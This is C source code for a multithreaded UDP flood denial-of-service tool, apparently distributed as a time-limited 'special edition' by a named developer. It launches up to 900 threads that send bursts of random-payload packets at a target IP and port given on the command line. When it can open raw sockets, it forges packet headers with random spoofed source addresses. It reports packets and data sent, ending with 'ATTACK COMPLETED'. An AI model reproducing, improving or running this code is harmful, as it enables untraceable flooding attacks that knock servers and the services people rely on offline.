#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>
#include <math.h>
#include <sched.h>
#include <signal.h>
#include <errno.h>

// Turbo Mode Parameters
#define BURST_COUNT 500
#define DOUBLE_FACTOR 8
#define BURST_SIZE 50000
#define DEFAULT_THREAD_COUNT 900
#define UPDATE_INTERVAL_US 50

#define EXPIRY_YEAR 2026
#define EXPIRY_MONTH 4
#define EXPIRY_DAY 10
#define DEFAULT_PACKET_SIZE 600

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
    int use_raw;
} attack_params;

volatile int keep_running = 1;
volatile unsigned long total_packets_sent = 0;
volatile unsigned long long total_bytes_sent = 0;
char *global_payload = NULL;

// ============== IP SPOOFING FUNCTIONS ==============

uint32_t generate_random_ip() {
    return (rand() % 0xFFFFFFFF);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    
    return answer;
}

int create_raw_socket() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return -1;
    int opt = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    return sock;
}

void build_spoofed_packet(char *packet, uint32_t spoofed_ip, uint32_t target_ip, 
                          int target_port, int packet_size) {
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    memcpy(payload, global_payload, packet_size);
    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + packet_size);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = spoofed_ip;
    iph->daddr = target_ip;
    
    udph->source = htons(rand() % 65535);
    udph->dest = htons(target_port);
    udph->len = htons(sizeof(struct udphdr) + packet_size);
    udph->check = 0;
    
    iph->check = in_cksum((unsigned short *)iph, sizeof(struct iphdr));
}

// ============== ORIGINAL FUNCTIONS (NO CHANGE) ==============

void handle_signal(int signal) {
    keep_running = 0;
}

void generate_random_payload(char *payload, int size) {
    FILE *urandom = fopen("/dev/urandom", "rb");
    if (urandom) {
        (void)fread(payload, 1, size, urandom);
        fclose(urandom);
    } else {
        for (int i = 0; i < size; i++) {
            payload[i] = (rand() ^ (rand() << 8)) & 0xFF;
        }
    }
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    int use_raw = params->use_raw;
    
    if (use_raw) {
        sock = create_raw_socket();
        if (sock < 0) {
            use_raw = 0;
            sock = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
        }
    } else {
        sock = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
    }
    
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &optval, sizeof(optval));

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);
    
    uint32_t target_ip_bin = server_addr.sin_addr.s_addr;
    char raw_packet[sizeof(struct iphdr) + sizeof(struct udphdr) + params->packet_size];

    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(params->thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    time_t start_time = time(NULL);
    struct timespec sleep_time = {0, UPDATE_INTERVAL_US * 1000};

    while (keep_running && difftime(time(NULL), start_time) < params->duration) {
        for (int i = 0; i < BURST_SIZE; i++) {
            if (use_raw) {
                uint32_t spoofed_ip = generate_random_ip();
                build_spoofed_packet(raw_packet, spoofed_ip, target_ip_bin, 
                                     params->target_port, params->packet_size);
                
                if (sendto(sock, raw_packet, sizeof(struct iphdr) + sizeof(struct udphdr) + params->packet_size, 0,
                           (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                    if (errno != EAGAIN && errno != EWOULDBLOCK) break;
                } else {
                    __sync_fetch_and_add(&total_packets_sent, 1);
                    __sync_fetch_and_add(&total_bytes_sent, params->packet_size);
                }
            } else {
                if (sendto(sock, global_payload, params->packet_size, 0,
                           (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                    if (errno != EAGAIN && errno != EWOULDBLOCK) break;
                } else {
                    __sync_fetch_and_add(&total_packets_sent, 1);
                    __sync_fetch_and_add(&total_bytes_sent, params->packet_size);
                }
            }
        }
        nanosleep(&sleep_time, NULL);
    }

    close(sock);
    return NULL;
}

void rgb_cycle(int step, char *buffer, size_t bufsize) {
    double frequency = 0.1;
    int red = (int)(sin(frequency * step + 0) * 127 + 128);
    int green = (int)(sin(frequency * step + 2) * 127 + 128);
    int blue = (int)(sin(frequency * step + 4) * 127 + 128);
    snprintf(buffer, bufsize, "\033[38;2;%d;%d;%dm", red, green, blue);
}

void print_color_text(const char *text, int step_offset) {
    char color_code[32];
    rgb_cycle(step_offset, color_code, sizeof(color_code));
    printf("%s%s\033[0m", color_code, text);
}

// ORIGINAL BANNER - BILKUL WAISA HI
void print_stylish_text(int step) {
    time_t now = time(NULL);
    struct tm expiry_date = {0};
    expiry_date.tm_year = EXPIRY_YEAR - 1900;
    expiry_date.tm_mon = EXPIRY_MONTH - 1;
    expiry_date.tm_mday = EXPIRY_DAY;
    time_t expiry_time = mktime(&expiry_date);

    double remaining_seconds = difftime(expiry_time, now);
    int remaining_days = (int)(remaining_seconds / (60 * 60 * 24));
    int remaining_hours = (int)fmod((remaining_seconds / (60 * 60)), 24);
    int remaining_minutes = (int)fmod((remaining_seconds / 60), 60);
    int remaining_seconds_int = (int)fmod(remaining_seconds, 60);

    char time_str[64];
    snprintf(time_str, sizeof(time_str), "%d days, %02d:%02d:%02d",
             remaining_days, remaining_hours, remaining_minutes, remaining_seconds_int);

    print_color_text("╔════════════════════════════════════════╗\n", step);
    print_color_text("║ ", step + 30); 
    print_color_text(" ", step + 60);
    print_color_text("»»—— 𝐀𝐋𝐎𝐍𝐄 ƁƠƳ ♥ SPECIAL EDITION", step + 90); 
    print_color_text(" ", step + 120);
    print_color_text("║\n", step + 150);
    print_color_text("╠════════════════════════════════════════╣\n", step + 180);
    print_color_text("║  DEVELOPED BY: @RAJOWNERX1           ║\n", step + 210);
    print_color_text("║  EXPIRY TIME: ", step + 240);
    print_color_text(time_str, step + 270); 
    print_color_text("      ║\n", step + 300);
    print_color_text("╠════════════════════════════════════════╣\n", step + 480);
    print_color_text("║ ", step + 510); 
    print_color_text(" ", step + 540);
    print_color_text("KYA GUNDA BANEGA RE 😂.              ", step + 570); 
    print_color_text(" ", step + 600);
    print_color_text("║\n", step + 630);
    print_color_text("╚════════════════════════════════════════╝\n", step + 660);
}

void display_progress(time_t start_time, int duration, int step) {
    time_t now = time(NULL);
    int elapsed = (int)difftime(now, start_time);
    int remaining = duration - elapsed;
    if (remaining < 0) remaining = 0;

    double data_gb = (double)total_bytes_sent / (1024 * 1024 * 1024);
    double data_mb = (double)total_bytes_sent / (1024 * 1024);
    
    char progress_str[256];
    if (data_gb >= 1.0) {
        snprintf(progress_str, sizeof(progress_str),
                 "Time Remaining: %02d:%02d | Packets Sent: %lu | Data Sent: %.2f GB",
                 remaining / 60, remaining % 60,
                 total_packets_sent,
                 data_gb);
    } else {
        snprintf(progress_str, sizeof(progress_str),
                 "Time Remaining: %02d:%02d | Packets Sent: %lu | Data Sent: %.2f MB",
                 remaining / 60, remaining % 60,
                 total_packets_sent,
                 data_mb);
    }

    printf("\033[2K\r");
    print_color_text(progress_str, step);
    fflush(stdout);
}

int main(int argc, char *argv[]) {
    srand(time(NULL));

    time_t now = time(NULL);
    struct tm *local = localtime(&now);
    if (local->tm_year + 1900 > EXPIRY_YEAR ||
        (local->tm_year + 1900 == EXPIRY_YEAR && local->tm_mon + 1 > EXPIRY_MONTH) ||
        (local->tm_year + 1900 == EXPIRY_YEAR && local->tm_mon + 1 == EXPIRY_MONTH && local->tm_mday > EXPIRY_DAY)) {
        print_color_text("Expired. Khatam Ho Gya HAI Developar Se Contact Kijiye @RAJOWNERX1.\n", 0);
        return EXIT_FAILURE;
    }

    if (argc < 3) {
        print_color_text("Example: ", 0);
        printf("%s 192.168.1.1 80 60\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = (argc > 3) ? atoi(argv[3]) : 60;
    int packet_size = (argc > 4) ? atoi(argv[4]) : DEFAULT_PACKET_SIZE;
    int thread_count = (argc > 5) ? atoi(argv[5]) : DEFAULT_THREAD_COUNT;

    if (packet_size <= 0 || thread_count <= 0) {
        print_color_text("Invalid packet size or thread count. Using defaults.\n", 0);
        packet_size = DEFAULT_PACKET_SIZE;
        thread_count = DEFAULT_THREAD_COUNT;
    }

    signal(SIGINT, handle_signal);

    global_payload = (char *)malloc(packet_size);
    if (!global_payload) {
        print_color_text("Failed to allocate memory for payload\n", 0);
        return EXIT_FAILURE;
    }
    generate_random_payload(global_payload, packet_size);

    // Check raw socket availability
    int test_raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int use_raw = (test_raw >= 0);
    if (test_raw >= 0) close(test_raw);

    pthread_t threads[thread_count];
    attack_params params[thread_count];

    time_t start_time = time(NULL);
    int color_step = 0;

    printf("\033[2J\033[H");
    
    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;
        params[i].use_raw = use_raw;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
            print_color_text("Failed to create thread\n", color_step);
            keep_running = 0;
            break;
        }
    }

    while (keep_running && time(NULL) < start_time + duration) {
        printf("\033[H");
        print_stylish_text(color_step);
        display_progress(start_time, duration, color_step);
        usleep(UPDATE_INTERVAL_US);
        color_step = (color_step + 5) % 360;
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\n");
    print_color_text("ATTACK COMPLETED. ", color_step);
    print_color_text("TOTAL PACKETS SENT: ", color_step + 60);
    printf("%lu | ", total_packets_sent);
    print_color_text("TOTAL DATA SENT: ", color_step + 120);
    
    double total_gb = (double)total_bytes_sent / (1024 * 1024 * 1024);
    if (total_gb >= 1.0) {
        printf("%.2f GB\n", total_gb);
    } else {
        double total_mb = (double)total_bytes_sent / (1024 * 1024);
        printf("%.2f MB\n", total_mb);
    }

    free(global_payload);
    return 0;
}
